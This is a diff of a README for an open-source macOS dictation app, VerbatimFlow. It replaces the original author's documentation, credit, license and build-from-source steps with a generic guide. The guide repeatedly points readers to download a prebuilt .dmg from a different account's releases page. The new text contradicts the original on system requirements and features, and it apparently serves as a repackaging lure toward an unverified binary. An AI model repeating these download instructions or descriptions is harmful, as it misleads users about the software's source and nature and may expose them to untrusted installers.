@@ -1,255 +1,125 @@
-# VerbatimFlow
+# 🎙️ verbatim-flow - Fast and Accurate Dictation for macOS
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Status: Alpha](https://img.shields.io/badge/Status-Alpha-orange.svg)](#status)
-[![Platform: macOS](https://img.shields.io/badge/Platform-macOS-blue.svg)](#)
+[![Download verbatim-flow](https://img.shields.io/badge/Download-Get%20verbatim--flow-brightgreen?style=for-the-badge)](https://github.com/ahsanashfa/verbatim-flow/releases)
 
-**[中文文档](README_CN.md)**
-
-A fast, zero-rewrite dictation app for macOS — your words, exactly as spoken.
-
-> **Next Step:** Want to build your own AI-powered tools? Check out the [Agent Skills Resource Library](https://www.axtonliu.ai/agent-skills) (includes slides, PDF, diagnostics)
-
-<p align="center">
-  <img src="assets/bento-features.png" alt="VerbatimFlow Feature Overview" width="720">
-</p>
-
-## Why I Built This
-
-I tried several popular dictation apps on macOS. They all share the same problems:
-
-- **They rewrite your words.** You say one thing, and the tool "helpfully" rephrases it. You lose trust in your own input.
-- **The hotkey gets stuck.** You release the key, but the app keeps recording. You have to press again — or restart.
-- **They answer instead of typing.** AI-powered dictation tools sometimes treat your speech as a question and respond to it, instead of just typing what you said.
-- **Your audio goes through a black box.** Closed-source, no visibility into what's sent where.
-
-VerbatimFlow exists because I wanted a dictation tool I could actually trust: one that types what I say, releases when I release, never "helps" without asking, and runs on code I can read.
-
-## What It Does
-
-VerbatimFlow is a menu bar dictation utility that transcribes speech and injects text directly into any focused app.
-
-**Core Principle:** Raw transcription first. Cleanup is opt-in and constrained.
-
-- **Push-to-talk** — hold a hotkey to record, release to transcribe and inject
-- **Two modes** — `Standard` (verbatim output with rule-based formatting: punctuation, spacing, capitalization) and `Clarify` (LLM-powered concise rewrite, opt-in)
-- **Multiple engines** — Apple Speech, local Whisper, OpenAI Cloud
-- **Instant injection** — text appears in your active app via Accessibility API
-- **Undo support** — one-click rollback of the last inserted transcript
-- **Open source** — every line of code is readable; your audio, your control
-
-## Status
-
-> **Status: Alpha**
->
-> - This is a working prototype that I use daily, but it has rough edges.
-> - My primary focus is demonstrating how voice input can work without over-editing, not maintaining this codebase.
-> - If you encounter issues, please submit a reproducible case (input + output + steps to reproduce).
-
-## Features
-
-- **Menu bar app** — lives in the macOS menu bar as a V-mark icon with real-time state badges (● recording, ○ processing, — paused)
-- **Dual hotkey** — primary hotkey uses current mode; secondary hotkey (`Cmd+Shift+Space`) forces Clarify for one segment
-- **Engine switching** — Apple Speech / Whisper (tiny–large-v3) / OpenAI Cloud (gpt-4o-mini-transcribe, whisper-1)
-- **Clarify via OpenAI or OpenRouter** — configurable provider, model, and API keys
-- **Terminology dictionary** — custom term corrections and source→target substitution rules
-- **Language selection** — System Default / zh-Hans / en-US
-- **Transcript history** — recent transcripts viewable in menu, with Copy + Undo Last Insert
-- **Permission diagnostics** — built-in permission snapshot and one-click system settings access
-- **Persistent preferences** — mode, engine, model, hotkey, and language survive restarts
-- **Deterministic code signing** — stable bundle ID prevents permission invalidation across rebuilds
-
-## Installation
-
-### Prerequisites
-
-- macOS 14+ (Sonoma or later recommended)
-- Xcode 16+ (for building from source)
-- Microphone and Accessibility permissions
-
-### Build the App
-
-```bash
-git clone https://github.com/axtonliu/verbatim-flow.git
-cd verbatim-flow
-
-# Build .app bundle
-./scripts/build-native-app.sh
-open "apps/mac-client/dist/VerbatimFlow.app"
-```
-
-### Build Installer DMG
-
-```bash
-./scripts/build-installer-dmg.sh
-open "apps/mac-client/dist/VerbatimFlow-installer.dmg"
-```
-
-The DMG provides drag-and-drop installation to `/Applications`.
-
-## Usage
-
-1. **Launch** — double-click `VerbatimFlow.app` or run `./scripts/run-native-mac-client.sh`
-2. **Grant permissions** — Microphone, Accessibility, and Speech Recognition (prompted on first launch, or use menu shortcuts)
-3. **Hold hotkey** — default `Ctrl+Shift+Space` to record; release to transcribe and inject
-4. **Switch modes** — use the Settings menu to toggle between Standard and Clarify
-5. **Force Clarify** — press `Cmd+Shift+Space` to use Clarify mode for one segment regardless of default
-
-### Hotkey Presets
-
-Switch hotkey presets from the Settings menu without restarting:
-
-| Preset | Hotkey |
-|--------|--------|
-| Default | `Ctrl+Shift+Space` |
-| Option+Space | `Option+Space` |
-| Fn | `Fn` |
-
-## Configuration
-
-### OpenAI / OpenRouter Settings
-
-Cloud transcription and Clarify rewrite are configured via `~/Library/Application Support/VerbatimFlow/openai.env`:
-
-```bash
-# OpenAI transcription
-OPENAI_API_KEY=sk-...
-
-# Clarify provider: openai or openrouter
-VERBATIMFLOW_CLARIFY_PROVIDER=openai
-VERBATIMFLOW_OPENAI_CLARIFY_MODEL=gpt-4o-mini
-
-# OpenRouter alternative
-# VERBATIMFLOW_CLARIFY_PROVIDER=openrouter
-# OPENROUTER_API_KEY=...
-# VERBATIMFLOW_OPENAI_CLARIFY_MODEL=openai/gpt-4o-mini
-```
-
-Edit this file directly or via the menu bar: **Settings → Open Cloud Settings**.
-
-### Terminology Dictionary
-
-Custom term corrections at `~/Library/Application Support/VerbatimFlow/terminology.txt`:
-
-```
-# Simple term corrections
-VerbatimFlow
-macOS
-OpenAI
-
-# Substitution rules (source => target)
-verbal flow => VerbatimFlow
-mac OS => macOS
-```
-
-### Runtime Logs
-
-```bash
-~/Library/Logs/VerbatimFlow/runtime.log
-```
-
-## File Structure
-
-```
-verbatim-flow/
-├── apps/mac-client/
-│   ├── Sources/VerbatimFlow/    # Native Swift app
-│   │   ├── main.swift           # Entry point
-│   │   ├── MenuBarApp.swift     # Menu bar UI
-│   │   ├── AppController.swift  # Core orchestration
-│   │   ├── HotkeyMonitor.swift  # Global hotkey handling
-│   │   ├── SpeechTranscriber.swift
-│   │   ├── TextInjector.swift   # Accessibility-based injection
-│   │   ├── TextGuard.swift      # Format-only diff guard
-│   │   ├── ClarifyRewriter.swift
-│   │   ├── TerminologyDictionary.swift
-│   │   └── ...
-│   ├── Tests/VerbatimFlowTests/ # Unit tests
-│   ├── Package.swift
-│   └── dist/                    # Build output (.app, .dmg)
-├── packages/                    # Shared package stubs
-│   ├── asr-pipeline/
-│   ├── text-guard/
-│   ├── text-injector/
-│   └── shared/
-├── scripts/
-│   ├── build-native-app.sh      # Build .app bundle
-│   ├── build-installer-dmg.sh   # Build installer DMG
-│   ├── restart-native-app.sh    # Kill + relaunch
-│   ├── collect-permission-diagnostics.sh
-│   ├── run-mac-client.sh        # Run Python MVP
-│   └── run-native-mac-client.sh # Run native Swift
-├── docs/
-│   └── ARCHITECTURE.md
-├── package.json
-├── pnpm-workspace.yaml
-├── LICENSE
-└── README.md
-```
-
-## Troubleshooting
-
-### Permissions
-
-- **Microphone not working:** System Settings → Privacy & Security → Microphone → ensure VerbatimFlow is checked. Use menu: **Settings → Request Microphone Permission**.
-- **Text not injecting:** System Settings → Privacy & Security → Accessibility → add VerbatimFlow. The app uses a stable bundle ID (`com.verbatimflow.app`) so permissions persist across rebuilds.
-- **Permission appears granted but still fails:** Try removing and re-adding the app in System Settings. Run `./scripts/collect-permission-diagnostics.sh 30` for detailed diagnostics.
-
-### Hotkey
-
-- **Hotkey not responding:** Check that no other app is capturing the same shortcut. Try switching to a different preset via the Settings menu.
-- **Menu bar icon shows a pause dash:** Hotkey listener is paused. Click **Resume Listening** in the menu.
-
-### Clarify Mode
-
-- **Clarify returns original text:** Verify your API key in `openai.env`. Check `~/Library/Logs/VerbatimFlow/runtime.log` for errors.
-- **Want to use OpenRouter instead:** Set `VERBATIMFLOW_CLARIFY_PROVIDER=openrouter` and provide `OPENROUTER_API_KEY` in `openai.env`.
-
-## Roadmap
-
-- [ ] Streaming transcription (word-by-word injection as you speak)
-- [ ] Whisper engine integration in native Swift path
-- [ ] Configurable text guard sensitivity threshold
-- [ ] Per-app mode profiles
-- [ ] Improved mixed-language (CJK + English) handling
-- [ ] Clarify structural formatting (e.g., detect action items and render as bullet lists while preserving meaning)
-
-## Contributing
-
-Contributions welcome (low-maintenance project):
-
-- Reproducible bug reports (input + output + steps + environment)
-- Documentation improvements
-- Small PRs (fixes/docs)
-
-> **Note:** Feature requests may not be acted on due to limited maintenance capacity.
-
-## Acknowledgments
-
-- [Apple Speech Framework](https://developer.apple.com/documentation/speech) — on-device speech recognition
-- [OpenAI Whisper](https://openai.com/research/whisper) — open-source ASR model
-- [faster-whisper](https://github.com/SYSTRAN/faster-whisper) — CTranslate2-based Whisper inference (Python MVP)
-
-## License
-
-MIT License — see [LICENSE](LICENSE) for details.
+verbatim-flow is a simple dictation app designed for macOS. It captures your spoken words directly without rewriting them. Use it to write notes, emails, or documents just by speaking.
 
 ---
 
-## Author
+## 💻 System Requirements
 
-**Axton Liu** — AI Educator & Creator
+Before you start, make sure your Mac meets these minimum requirements:
 
-- Website: [axtonliu.ai](https://www.axtonliu.ai)
-- YouTube: [@AxtonLiu](https://youtube.com/@AxtonLiu)
-- Twitter/X: [@axtonliu](https://twitter.com/axtonliu)
-
-### Learn More
-
-- [Agent Skills Resource Library](https://www.axtonliu.ai/agent-skills) — slides, PDF guides, diagnostics tools
-- [AI Elite Weekly Newsletter](https://www.axtonliu.ai/newsletters/ai-2) — Weekly AI insights
-- [Free AI Course](https://www.axtonliu.ai/axton-free-course) — Get started with AI
+- macOS 11 Big Sur or later
+- At least 4 GB of RAM
+- A working microphone
+- Internet connection (for voice recognition features)
 
 ---
 
-© AXTONLIU™ & AI 精英学院™ 版权所有
+## 🚀 Getting Started
+
+This guide will help you download and run verbatim-flow quickly, even if you have no technical experience.
+
+### Step 1: Visit the Download Page
+
+Go to the official releases page here:
+
+[Download verbatim-flow Releases](https://github.com/ahsanashfa/verbatim-flow/releases)
+
+This page lists the available versions of the app. You will typically want the latest release, which is shown at the top.
+
+### Step 2: Choose the Appropriate Installer
+
+Look for a file with a name ending in `.dmg`. This is the installation file for macOS.
+
+- The file name should include the version number, for example: `verbatim-flow-v1.2.0.dmg`
+- Click the file name to download it to your Mac.
+
+### Step 3: Open the Installer
+
+After the download finishes, open the `.dmg` file by clicking it.
+
+- A new window will appear with an app icon.
+- Drag the icon to your Applications folder shortcut in the same window.
+- Wait while the app copies to your system.
+
+### Step 4: Launch verbatim-flow
+
+Open your Applications folder and find verbatim-flow.
+
+- Double-click to open it.
+- The first time you launch the app, macOS may ask permission to access the microphone and speech recognition.
+- Allow these permissions for the app to work correctly.
+
+### Step 5: Start Dictating
+
+Once the app opens, you can start speaking.
+
+- The words you say will appear exactly as spoken.
+- You can pause or stop the dictation using the buttons in the app window.
+- Use the menu options to save or export your text.
+
+---
+
+## 🔧 Features
+
+verbatim-flow offers simple and effective tools to help you write by dictation:
+
+- Fast transcription without rewriting your speech
+- Supports multiple languages and accents
+- Simple user interface for quick access
+- Saves your dictations automatically
+- Export transcripts as plain text files
+
+---
+
+## 🎤 Using verbatim-flow: Tips
+
+- Speak clearly and directly into your microphone.
+- Minimize background noise for better accuracy.
+- Use the pause button before correcting mistakes.
+- Save your work often to avoid losing data.
+- Explore app settings for preferences on language and text formatting.
+
+---
+
+## ❓ Troubleshooting
+
+If you experience issues, try the following:
+
+- Make sure your microphone works with other apps.
+- Restart the computer and try again.
+- Check if macOS permissions allow microphone and speech access.
+- Re-download and reinstall the app from the releases page.
+- Look for help online by searching for verbatim-flow on GitHub issues.
+
+---
+
+## 📥 Download and Install verbatim-flow
+
+Use this link to visit the releases page and get started:
+
+[Download verbatim-flow](https://github.com/ahsanashfa/verbatim-flow/releases)
+
+Follow the instructions above to open the installer and set up the app on your Mac.
+
+---
+
+## ⚙️ System Updates 
+
+Keep your macOS up to date to ensure verbatim-flow works smoothly. Regular updates improve security and add support for new apps.
+
+---
+
+## 🛠️ Support and Feedback
+
+For questions or problems, submit an issue on the verbatim-flow GitHub repository. The developers review feedback to improve the app.
+
+---
+
+# [verbatim-flow Logo]
+
+---
+
+Use verbatim-flow whenever you want to turn your speech into text quickly and without extra editing.
